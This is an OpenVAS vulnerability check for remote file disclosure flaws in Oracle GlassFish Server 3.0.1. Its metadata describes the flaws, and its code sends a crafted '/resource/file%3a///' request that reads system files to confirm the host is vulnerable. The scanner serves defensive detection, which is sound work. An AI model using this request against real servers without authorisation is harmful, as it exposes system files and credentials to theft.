###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_glassfish_mult_remote_file_disc_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Oracle GlassFish Server Multiple Remote File Disclosure Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:oracle:glassfish_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808231");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2017-1000030", "CVE-2017-1000029");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2016-06-21 11:16:21 +0530 (Tue, 21 Jun 2016)");
  script_name("Oracle GlassFish Server Multiple Remote File Disclosure Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Oracle GlassFish
  Server and is prone to multiple remote file disclosure vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The Multiple flaws are due to:

  - An insufficient validation of user supplied input via 'file' GET parameter 
    in the file system API in Oracle GlassFish Server.

  - An unauthenticated access is possible to 'JVM Report page' which will disclose 
    Java Key Store password of The Admin Console.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files on the server, to obtain administrative 
  privileged access to the web interface of the affected device and to launch 
  further attacks on the affected system.

  Impact Level: Application");

  script_tag(name:"affected", value:"GlassFish Server Open Source Edition 
  version 3.0.1 (build 22)");

  script_tag(name:"solution", value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name : "URL" , value : "https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-011/?fid=8037");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("GlassFish_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("GlassFish/installed");
  script_require_ports("Services/www", 4848);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
sndReq = "";
rcvRes = "";
http_port = 0;

# Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## iterate over list
files = traversal_files();

foreach file (keys(files))
{
  ## Construct Vulnerable URL
  url = '/resource/file%3a///' + files[file];

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:http_port, url:url, pattern:file, check_header:TRUE))
  {
    report = report_vuln_url(port:http_port, url:url );
    security_message(port:http_port, data:report);
    exit(0);
  }
}

